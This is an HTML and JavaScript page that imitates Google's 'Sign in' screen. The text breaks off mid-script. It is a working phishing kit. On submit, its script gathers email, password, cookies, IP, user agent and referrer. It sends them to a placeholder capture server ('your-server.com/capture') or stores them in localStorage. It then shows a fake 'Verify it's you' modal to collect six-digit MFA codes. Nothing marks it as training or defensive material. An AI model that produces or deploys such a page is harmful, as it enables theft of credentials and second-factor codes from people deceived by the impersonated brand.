<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        /* Google-like Styling */
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            width: 100%;
            max-width: 428px;
            padding: 48px;
            box-sizing: border-box;
            text-align: center;
        }
        .logo {
            width: 72px;
            height: 72px;
            margin: 0 auto 24px;
        }
        .logo img {
            width: 100%;
            height: 100%;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            margin: 0 0 8px;
            color: #3c4043;
        }
        .subtitle {
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 24px;
        }
        .input-group {
            position: relative;
            margin-bottom: 24px;
            text-align: left;
        }
        .input-group label {
            display: block;
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 8px;
            transition: transform 0.2s;
        }
        .input-group input {
            width: 100%;
            padding: 12px 16px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
        }
        .input-group input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }
        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
        }
        .btn-primary {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .btn-primary:hover {
            background-color: #1557b0;
        }
        .btn-secondary {
            background: none;
            border: none;
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            text-decoration: none;
        }
        .footer {
            margin-top: 24px;
            font-size: 12px;
            color: #5f6368;
        }
        .mfa-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .mfa-content {
            background: white;
            padding: 32px;
            border-radius: 8px;
            max-width: 400px;
            text-align: center;
        }
        .mfa-content h2 {
            margin-top: 0;
            font-size: 20px;
        }
        .mfa-content input {
            width: 100%;
            padding: 12px;
            margin: 16px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 18px;
            text-align: center;
            letter-spacing: 4px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1a73e8;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .error {
            color: #d93025;
            font-size: 14px;
            margin-bottom: 12px;
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">
            <!-- Google Logo SVG -->
            <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
                <path d="M115.75 47.18c0-11.16-9.14-20.25-20.38-20.25S75 36.02 75 47.18s9.14 20.25 20.38 20.25c5.73 0 10.97-2.22 14.86-5.84l-7.16-7.16c-1.26 1.19-3.04 1.94-5.1 1.94-5.97 0-10.82-4.85-10.82-10.82s4.85-10.82 10.82-10.82c2.84 0 5.41 1.09 7.31 2.86l7.53-7.53c-4.07-3.78-9.64-6.1-15.77-6.1-15.67 0-28.38 12.71-28.38 28.38s12.71 28.38 28.38 28.38c8.16 0 15.51-3.38 20.7-8.77l-7.53-7.53c-2.26 2.38-5.39 3.84-8.88 3.84z" fill="#4285F4"/>
                <path d="M155.25 47.18c0-11.16-9.14-20.25-20.38-20.25S115 36.02 115 47.18s9.14 20.25 20.38 20.25c5.73 0 10.97-2.22 14.86-5.84l-7.16-7.16c-1.26 1.19-3.04 1.94-5.1 1.94-5.97 0-10.82-4.85-10.82-10.82s4.85-10.82 10.82-10.82c2.84 0 5.41 1.09 7.31 2.86l7.53-7.53c-4.07-3.78-9.64-6.1-15.77-6.1-15.67 0-28.38 12.71-28.38 28.38s12.71 28.38 28.38 28.38c8.16 0 15.51-3.38 20.7-8.77l-7.53-7.53c-2.26 2.38-5.39 3.84-8.88 3.84z" fill="#EA4335"/>
                <path d="M195.75 47.18c0-11.16-9.14-20.25-20.38-20.25S155 36.02 155 47.18s9.14 20.25 20.38 20.25c5.73 0 10.97-2.22 14.86-5.84l-7.16-7.16c-1.26 1.19-3.04 1.94-5.1 1.94-5.97 0-10.82-4.85-10.82-10.82s4.85-10.82 10.82-10.82c2.84 0 5.41 1.09 7.31 2.86l7.53-7.53c-4.07-3.78-9.64-6.1-15.77-6.1-15.67 0-28.38 12.71-28.38 28.38s12.71 28.38 28.38 28.38c8.16 0 15.51-3.38 20.7-8.77l-7.53-7.53c-2.26 2.38-5.39 3.84-8.88 3.84z" fill="#FBBC05"/>
                <path d="M235.75 47.18c0-11.16-9.14-20.25-20.38-20.25S195 36.02 195 47.18s9.14 20.25 20.38 20.25c5.73 0 10.97-2.22 14.86-5.84l-7.16-7.16c-1.26 1.19-3.04 1.94-5.1 1.94-5.97 0-10.82-4.85-10.82-10.82s4.85-10.82 10.82-10.82c2.84 0 5.41 1.09 7.31 2.86l7.53-7.53c-4.07-3.78-9.64-6.1-15.77-6.1-15.67 0-28.38 12.71-28.38 28.38s12.71 28.38 28.38 28.38c8.16 0 15.51-3.38 20.7-8.77l-7.53-7.53c-2.26 2.38-5.39 3.84-8.88 3.84z" fill="#34A853"/>
            </svg>
        </div>
        <h1 id="main-title">Sign in</h1>
        <p class="subtitle" id="main-subtitle">Use your Google Account</p>

        <div class="error" id="error-msg"></div>
        <div class="spinner" id="loader"></div>

        <form id="login-form" autocomplete="off">
            <div class="input-group">
                <label for="email">Email or phone</label>
                <input type="text" id="email" name="email" placeholder="Email or phone" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <div class="actions">
                <button type="button" class="btn-secondary">Forgot email?</button>
                <button type="button" class="btn-secondary">Forgot password?</button>
                <button type="submit" class="btn-primary">Next</button>
            </div>
        </form>

        <div class="footer">
            <p>Not your computer? Use Guest mode to sign in privately. Learn more about Google+ Guest mode</p>
        </div>
    </div>

    <!-- MFA Modal -->
    <div class="mfa-modal" id="mfa-modal">
        <div class="mfa-content">
            <h2>Verify it's you</h2>
            <p>Enter the 6-digit code we sent to your phone or email.</p>
            <input type="text" id="mfa-code" maxlength="6" placeholder="000000">
            <button class="btn-primary" id="mfa-submit">Verify</button>
            <button class="btn-secondary" id="mfa-cancel">Cancel</button>
        </div>
    </div>

    <script>
        // Configuration
        const API_ENDPOINT = "YOUR_SERVER_ENDPOINT"; // e.g., "https://your-server.com/capture"
        const USE_LOCAL_STORAGE = API_ENDPOINT === "YOUR_SERVER_ENDPOINT";

        document.getElementById('login-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const userAgent = navigator.userAgent;
            const ip = await getUserIP();
            const referrer = document.referrer;
            const cookies = document.cookie;

            const payload = {
                email: email,
                password: password,
                userAgent: userAgent,
                ip: ip,
                referrer: referrer,
                cookies: cookies,
                timestamp: new Date().toISOString()
            };

            showLoader(true);
            hideError();

            try {
                if (USE_LOCAL_STORAGE) {
                    // Fallback: Store in localStorage if no backend
                    const creds = JSON.parse(localStorage.getItem('creds') || '[]');
                    creds.push(payload);
                    localStorage.setItem('creds', JSON.stringify(creds));
                    console.log("Credentials stored locally:", payload);
                } else {
                    // Send to backend
                    await fetch(API_ENDPOINT, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                }

                // Show MFA Modal
                setTimeout(() => {
                    showLoader(false);
                    document.getElementById('mfa-modal').style.display = 'flex';
                }, 1000);

            }
